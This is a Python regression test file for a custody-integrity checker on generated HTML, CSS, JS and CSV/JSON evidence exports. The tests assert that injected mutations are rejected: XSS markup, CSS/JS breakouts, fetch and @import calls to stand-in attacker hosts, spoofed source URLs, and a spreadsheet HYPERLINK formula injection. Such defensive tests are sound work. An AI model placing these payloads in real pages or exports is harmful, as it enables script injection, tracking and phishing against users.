#!/usr/bin/env python3
"""Adversarial source-custody checks; mutations must be rejected even with new hashes."""
from __future__ import annotations
import copy
import csv
import hashlib
from io import StringIO
import json
from pathlib import Path
import shutil
import tempfile
import unittest
import sys

HERE=Path(__file__).resolve().parent
BRIDGE=HERE.parent.parent
sys.path.insert(0,str(HERE))
from custody_integrity import check_assets,check_directory,validate_payloads,CustodyError

class CustodyRegressions(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        from build_sealed import build
        # The release builder itself requires the custody gate to pass.
        # This test never changes the pinned upstream source.
        cls.temp=tempfile.TemporaryDirectory(prefix='fv-apollo-custody-')
        build(Path(cls.temp.name)/'release.zip')
        cls.generated=BRIDGE/'generated'
        cls.html=(cls.generated/'fragment.html').read_text(encoding='utf-8')
        cls.css=(cls.generated/'apollo.css').read_text(encoding='utf-8')
        cls.js=(cls.generated/'apollo.js').read_text(encoding='utf-8')
        cls.files={p.name:p.read_bytes() for p in cls.generated.iterdir() if p.name!='manifest.json'}

    @classmethod
    def tearDownClass(cls):cls.temp.cleanup()

    def test_01_real_exact_source(self):
        receipt=check_directory(self.generated)
        self.assertEqual(receipt['status'],'PASS')
        self.assertEqual(receipt['evidence_records'],6)
        self.assertEqual(receipt['response_records'],6)
        self.assertEqual(receipt['download_links'],['evidence-export.csv','evidence-export.json','response-export.csv','response-export.json'])
        self.assertGreater(receipt['anchors'],100)
        self.assertGreaterEqual(receipt['source_drawers'],6)

    def test_02_reject_active_markup_and_broken_source_access(self):
        bad=(
            '<img src="https://example.org/tracker.png">',
            '<iframe srcdoc="<p>fake source</p>"></iframe>',
            '<svg onload="alert(1)"></svg>',
            '<a href="javascript:alert(1)">malicious</a>',
            '<a href="http://www.nasa.gov">insecure source</a>',
            '<a href="https://www.nasa.gov/" target="_blank">missing noopener</a>',
            '<a href="#unreviewed-reference">broken citation</a>',
            '<div id="atlas"></div>',
            '<details hidden><summary>Hidden evidence</summary></details>',
            '<details aria-hidden="true"><summary>Hidden evidence</summary></details>',
            '<a href="https://example.org/fake-source" target="_blank" rel="noopener noreferrer">fake</a>',
            '<input id="stray" onfocus="alert(1)">',
            '<a href="https://www.nasa.gov/" href="https://example.org">duplicate href</a>',
        )
        for payload in bad:
            with self.subTest(payload=payload[:48]),self.assertRaises(CustodyError):
                check_assets(self.html+payload,self.css,self.js)

    def test_03_reject_css_and_js_source_breakouts(self):
        mutations=(
            (self.css+'</style><script>alert(1)</script>', self.js),
            (self.css+'@import url(https://attacker.invalid/a.css)', self.js),
            (self.css+'.x{background:url(//attacker.invalid/t)}', self.js),
            (self.css+'.x{width:expression(alert(1))}', self.js),
            (self.css,self.js+'</script><script>alert(1)</script>'),
            (self.css,self.js+';fetch("https://attacker.invalid")'),
            (self.css,self.js+';localStorage.setItem("a","b")'),
            (self.css,self.js+';eval("alert(1)")'),
        )
        for css,js in mutations:
            with self.subTest(css_tail=css[-40:],js_tail=js[-40:]),self.assertRaises(CustodyError):
                check_assets(self.html,css,js)

    def test_04_reject_claims_and_export_drift(self):
        original={k:v for k,v in self.files.items() if k in ('evidence-export.csv','evidence-export.json','response-export.csv','response-export.json')}
        def mutated(kind,fn):
            changed=dict(original)
            parsed=json.loads(changed[kind].decode('utf-8'))
            fn(parsed)
            changed[kind]=json.dumps(parsed).encode('utf-8')
            return changed
        cases=(
            mutated('evidence-export.json',lambda d:d.update(not_a_rights_clearance=False)),
            mutated('evidence-export.json',lambda d:d.update(no_geographic_coordinates=False)),
            mutated('evidence-export.json',lambda d:d['records'][0].update(geometry='34.6,-86.7')),
            mutated('evidence-export.json',lambda d:d['records'][0].update(media_status='cleared_for_publication')),
            mutated('evidence-export.json',lambda d:d['records'][0].update(image_record_url='https://www.nasa.gov.evil.invalid/source')),
            mutated('evidence-export.json',lambda d:d['records'][0].update(board_locator='')),
            mutated('response-export.json',lambda d:d.update(not_a_completed_remediation_audit=False)),
            mutated('response-export.json',lambda d:d.update(no_geolocations=False)),
            mutated('response-export.json',lambda d:d['rows'][0].update(geometry='Kennedy Space Center 28.6,-80.6')),
            mutated('response-export.json',lambda d:d['rows'][0].update(response_url='https://not-nasa.invalid/doc')),
            mutated('response-export.json',lambda d:d['rows'][0].update(image_reuse='embedded NASA photo')),
        )
        for files in cases:
            with self.subTest(drift=len(str(files))),self.assertRaises(CustodyError):
                validate_payloads(files)
        # Formula strings can execute when exported CSV is opened in a spreadsheet.
        formula=dict(original)
        text=formula['evidence-export.csv'].decode('utf-8')
        formula['evidence-export.csv']=text.replace('Apollo 1 crew training portrait','=HYPERLINK("https://phishing.invalid")',1).encode()
        with self.assertRaises(CustodyError): validate_payloads(formula)

    def test_05_rehashed_malicious_html_remains_blocked(self):
        with tempfile.TemporaryDirectory() as work:
            dst=Path(work)
            for p in self.generated.iterdir():shutil.copy2(p,dst/p.name)
            path=dst/'fragment.html'
            raw=path.read_text(encoding='utf-8')+'<img src="https://evil.invalid">'
            path.write_text(raw,encoding='utf-8')
            manifest=json.loads((dst/'manifest.json').read_text(encoding='utf-8'))
            manifest['outputs_sha256']['fragment.html']=hashlib.sha256(raw.encode()).hexdigest()
            (dst/'manifest.json').write_text(json.dumps(manifest),encoding='utf-8')
            with self.assertRaises(CustodyError):check_directory(dst)

if __name__=='__main__':unittest.main()
